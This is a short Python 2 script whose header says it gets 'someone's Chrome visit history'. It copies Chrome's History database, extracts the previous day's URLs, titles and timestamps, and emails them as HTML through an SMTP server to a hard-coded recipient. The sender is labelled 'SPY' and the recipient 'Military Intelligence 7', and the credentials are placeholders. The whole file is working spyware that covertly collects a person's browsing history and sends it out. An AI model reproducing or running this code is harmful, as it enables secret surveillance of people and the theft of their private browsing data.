#!/usr/bin/python
# Author : Yuan
# Version: Alpha
# Desc	 : This script is used for get someone's Chrome visit history.
# At first , copy "History" to "HistoryBackup" to prevent file locked by Chrome.
# Then use sqlite3 module of python2.7 , select data what i need .


import time
import datetime
import os
import sqlite3
import shutil
from email.mime.text import MIMEText
from email.header import Header
from email.utils import parseaddr, formataddr
import smtplib

now = datetime.datetime.now()
now_000 = time.strftime('%Y-%m-%d',datetime.datetime.timetuple(now))

today = datetime.datetime.strptime(now_000,'%Y-%m-%d')
yesterday = today - datetime.timedelta(days=1)
basedate = datetime.datetime(1601,1,1)

yesterday_timestamp = (yesterday - basedate).total_seconds ()

chrome_history_file = '/root/History'
chrome_history_file_bak = '/root/HistoryBackup'

def remove_copy ():
	if os.path.exists(chrome_history_file_bak):
		os.remove(chrome_history_file_bak)
	#shutil.copyfile("History","HistoryBackup")
	shutil.copyfile(chrome_history_file,chrome_history_file_bak)
	
def get_data ():
	if not os.path.exists(chrome_history_file_bak):
		raise Exception('Chrome history file does not exist!')

	connect = sqlite3.connect(chrome_history_file_bak)
	cursor = connect.cursor()
	query = 'select url,title,last_visit_time from urls order by last_visit_time desc'

	try:
		cursor.execute(query)
	except sqlite3.OperationalError:
		print('file locked!')

	history_data = cursor.fetchall()
	expectdata = []

	for data in history_data:
		last_visit_time = data[2] / 1000 / 1000
		if last_visit_time > yesterday_timestamp:
			visit_time = basedate + datetime.timedelta(seconds=last_visit_time,hours=8)
			visit_time = time.strftime('%Y-%m-%d %H:%M:%S',datetime.datetime.timetuple(visit_time))
			expectdata.append(visit_time + '$||$'+ data[1] + '$||$' + data[0])
		else:
			if expectdata == []:
				raise Exception('No data in history file!')
			break
	cursor.close()
	connect.close()
	return '\n'.join(expectdata)

def _format_addr(s):
	name, addr = parseaddr(s)
	return formataddr((Header(name, 'utf-8').encode(), addr))

def send ():
	from_addr = 'abuse@google.com'
	passwd = 'abuse'
	to_addr = 'abuse@google.com'
	smtp_server = 'smtp.google.com'
	
	mimestr = '<html><body><h1>Chrome history on Yesterday of SOMEONE</h1>'
	for history_data in get_data().split('\n'):
		history_data_split = history_data.split('$||$')
		mimestr = mimestr + '<p>' +\
			history_data_split[0] + ' ' +\
			history_data_split[1] + ' ' +\
			 '<a href=\"' + history_data_split[2] + '\">' + history_data_split[2] + '</a></p>'
	mimestr = mimestr + '</body></html>'
	
	msg = MIMEText(mimestr , 'html' ,'utf-8')
	msg['From'] = _format_addr('SPY <%s>' % from_addr)
	msg['To'] = _format_addr('Military Intelligence 7 <%s>' % to_addr)
	msg['Subject'] = Header('Chrome visit site on yesterday', 'utf-8').encode()

	server = smtplib.SMTP(smtp_server,25)
	server.set_debuglevel(1)
	server.login(from_addr,passwd)
	server.sendmail(from_addr,[to_addr],msg.as_string())
	server.quit()

if __name__ == '__main__':
	remove_copy()
	send()

